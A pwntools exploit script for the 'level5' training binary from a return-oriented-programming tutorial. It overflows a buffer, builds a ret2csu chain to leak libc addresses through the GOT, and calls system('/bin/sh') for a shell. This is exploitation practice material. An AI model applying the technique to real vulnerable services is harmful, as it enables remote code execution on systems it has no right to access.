from pwn import *
from LibcSearcher import *

# obtained from https://github.com/zhengmin1989/ROP_STEP_BY_STEP/tree/master/linux_x64
binary_name = 'level5'
p = process(binary_name)
elf = ELF(binary_name)

offset = 136

csu1 = 0x4005ea
csu2 = 0x4005d0

main = elf.symbols['main']
write_got = elf.got['write']
read_got = elf.got['read']

bss = elf.bss()

def csu(func_addr, edi, rsi, rdx, ret):
	payload = ''
	payload += p64(csu1)		# overwrite ret addr
	payload += p64(0)	 		# rbx 
	payload += p64(1)			# rbp
	payload += p64(func_addr)	# pop r12 -> call qword ptr[r12 + rbx * 8]
	payload += p64(edi)			# pop r13 -> mov edi, r13d
	payload += p64(rsi)			# pop r14 -> mov rsi, r14
	payload += p64(rdx)			# pop r15 -> mov rdx, r15
	payload += p64(csu2)		# after popping everything, we ret to csu2

	# earlier, we set rbx = 0, rbp = 1
	# rbx = rbx + 1 -> rbx = 1
	# rbp = 1
	# cmp rbx, rbp will set ZF=1
	# jne 0x4005d0 will be ignored
	payload += 'a' * 7 * 8		# just fill up the stack, because add rsp, 8 and 6 more pops
	payload += p64(ret)			# return addr
	return payload

# first step, we want to leak libc version, can do that by leaking GOT entry of write and read
p.recvuntil('Hello, World\n')
log.info('Leaking write libc address')
payload = 'a' * offset
payload += csu(write_got, 1, write_got, 8, main)
p.send(payload)

write_leak = u64(p.recv(8))
log.success("Leaked write libc address: 0x%x" % write_leak)

# leak GOT of read
p.recvuntil('Hello, World\n')
log.info('Leaking read libc address')
payload = 'a' * offset
payload += csu(write_got, 1, read_got, 8, main)
p.send(payload)

read_leak = u64(p.recv(8))
log.success("Leaked read libc address: 0x%x" % read_leak)

# get libc
libc = LibcSearcher('write', write_leak)
libc.add_condition('read', read_leak)
libc_base = write_leak - libc.dump('write')
log.success('Libc base: 0x%x' % libc_base)

# ok now we want to do system('/bin/sh'), so read '/bin/sh' and address of system into bss
p.recvuntil('Hello, World\n')
log.info('Writing system address and /bin/sh into bss')
payload = 'a' * offset
payload += csu(read_got, 0, bss, 16, main)
p.send(payload)
system_libc = libc_base + libc.dump('system')
payload = p64(system_libc)
payload += '/bin/sh\x00'
p.send(payload)

# now we can just call system
p.recvuntil('Hello, World\n')
payload = 'a' * offset
payload += csu(bss, bss + 8, 0, 0, main)
p.send(payload)
p.interactive()
